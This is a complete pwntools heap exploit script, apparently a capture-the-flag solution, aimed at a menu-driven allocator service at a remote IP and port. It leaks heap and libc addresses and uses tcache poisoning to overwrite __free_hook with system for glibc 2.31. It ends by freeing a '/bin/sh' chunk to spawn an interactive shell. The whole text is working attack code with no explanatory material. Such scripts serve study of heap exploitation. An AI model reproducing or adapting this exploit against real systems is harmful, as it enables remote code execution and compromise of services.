from pwn import *

###Util
def create(size,data):
    r.sendlineafter('Choice >','1')
    r.sendlineafter('size : ',str(size))
    r.sendafter('Content : ',data)

def show(idx):
    r.sendlineafter('Choice >','2')
    r.sendlineafter('index : ',str(idx))
    return r.recvline()[:-1]

def edit(idx,data):
    r.sendlineafter('Choice >','3')
    r.sendlineafter('index : ',str(idx))
    r.sendafter('Content : ',data)

def delete(idx):
    r.sendlineafter('Choice >','4')
    r.sendlineafter('index : ',str(idx))

###Addr
#  libc2.31
main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x1eeb28
system_offset = 0x55410

###Exploit
r = remote('140.112.31.97',30203)

create(0x78,'M30W') #0
create(0x78,'M30W') #1
create(0x18,'M30W') #2
delete(1)
delete(0)
create(0x78,b'\x10')    #3
heap_addr = u64(show(3).ljust(8,b'\x00'))-0x310
print(hex(heap_addr))

delete(0)
edit(3,b'\x00'*0x10)
delete(0)
create(0x78,p64(heap_addr+0x290))   #4
create(0x78,'M30W') #5
create(0x78,p64(0)+p64(0x101))  #6
for i in range(7):
    delete(0)
    edit(3,b'\x00'*0x10)
delete(0)
unsorted_bin_addr = u64(show(3)+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

edit(6,p64(0)+p64(0x81))
for i in range(2):
    delete(0)
    edit(3,b'\x00'*0x10)
delete(0)
create(0x78,p64(libc_base+free_hook_offset-0x8))    #7
create(0x78,'M30W') #8
create(0x78,b'/bin/sh\x00'+p64(libc_base+system_offset))    #9
delete(9)

r.interactive()
